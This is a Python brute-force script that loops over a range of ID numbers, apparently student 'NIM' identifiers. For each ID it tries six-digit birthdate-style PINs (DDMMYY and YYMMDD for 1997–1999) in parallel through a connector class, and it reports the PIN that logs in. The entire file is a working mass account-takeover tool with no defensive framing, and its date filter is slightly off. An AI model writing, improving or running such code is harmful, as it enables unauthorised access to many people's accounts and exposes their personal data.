#!/usr/bin/python3
import multiprocessing, time
from SConnector import SConnector

DICTIONARY = []

def multi(nim, pin, shared):
  if not shared.found:
    conn = SConnector(nim, pin)
    conn.connect()
    if conn.status:
      shared.found = True
      return pin
  return

class SBrute(object):
  def __init__(self, nim, process):
    self.nim = nim
    self.process = process

  def start(self, mt):
    start_time = time.time()
    print('Starting bruteforce for {}'.format(self.nim))
    global DICTIONARY

    shared = multiprocessing.Manager().Namespace()
    shared.found = False

    if self.process is None:
      p = multiprocessing.Pool()
    else:
      p = multiprocessing.Pool(self.process)
    result = p.starmap(multi, [[self.nim, d, shared] for d in DICTIONARY])
    result = list(set(result))
    result.remove(None)

    if len(result) == 1:
      print('Found {} {} time elapsed {}s'.format(self.nim, result[0], time.time()-start_time))
    else:
      print('Failed {} time elapsed {}s'.format(self.nim, time.time()-start_time))

def init_dictionary(start_year=97, end_year=99):
  global DICTIONARY

  print("Generating dictionary...")
  for yy in range(start_year, end_year+1):
    for mm in range(1, 13):
      for dd in range(1, 32):
        if mm == 2 and dd > 29:
          continue
        if mm % 2 == 0 and dd > 30:
          continue
        DICTIONARY.append(str(dd).zfill(2) + str(mm).zfill(2) + str(yy).zfill(2))
        DICTIONARY.append(str(yy).zfill(2) + str(mm).zfill(2) + str(dd).zfill(2))
  # print(DICTIONARY[0])
  print("Dictionary generated {} values".format(len(DICTIONARY)))

if __name__ == '__main__':
  import argparse

  parser = argparse.ArgumentParser()
  parser.add_argument("--start", help="start of NIM to bruteforce", required=True)
  parser.add_argument("--end", help="end of NIM to bruteforce", required=True)
  parser.add_argument('--process', nargs='?', type=int)
  args = parser.parse_args()

  # print(args.process)
  if args.process is None:
    print("Starting bruteforce with default process")
  else:
    print("Starting bruteforce with {} process".format(args.process))
  # print(args.start)
  # print(args.end)
  init_dictionary()

  start = int(args.start)
  end = int(args.end)+1

  for n in range(start, end):
    target = SBrute(n, args.process)
    target.start(True)